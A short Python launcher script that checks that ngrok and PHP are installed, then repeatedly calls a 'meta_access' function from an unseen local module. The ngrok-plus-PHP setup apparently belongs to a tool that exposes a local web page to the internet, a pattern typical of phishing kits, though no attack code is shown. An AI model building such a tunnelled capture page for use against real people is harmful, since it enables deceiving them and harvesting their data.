from modules import main_handeler
import subprocess , os , sys
from colorama import Fore

ngrok_output = subprocess.getoutput("ngrok")
if "COMMANDS:" in ngrok_output:
    None
else:
    os.system("clear")
    print("\033[1m"+Fore.LIGHTWHITE_EX+"\n    ["+Fore.LIGHTRED_EX+"!"+Fore.LIGHTWHITE_EX+"]"+"  Please Install Ngrok ")
    sys.exit()
    
php_output = subprocess.getoutput("php -version")
if "Copyright" in php_output:
    None
else:
    print("\033[1m"+Fore.LIGHTWHITE_EX+"\n    ["+Fore.LIGHTRED_EX+"!"+Fore.LIGHTWHITE_EX+"]"+"  Please Install PHP ")
    sys.exit()

while True:
    main_handeler.meta_access()